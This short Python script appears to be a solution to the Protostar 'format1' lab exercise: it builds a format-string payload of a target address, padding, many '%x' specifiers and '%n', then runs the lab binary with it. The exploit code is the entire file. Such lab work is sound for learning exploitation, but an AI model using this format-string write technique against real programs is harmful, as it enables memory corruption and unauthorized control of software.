
import os
import struct

def format(msg):
	return (msg+"R")[500:]



sploit="\x38\x96\x04\x08"+"\x5A"*(19)+"%x "*(132) + "%n" + "\n"

#print format(sploit)
os.system("/opt/protostar/bin/format1 \"%s\"" % sploit)
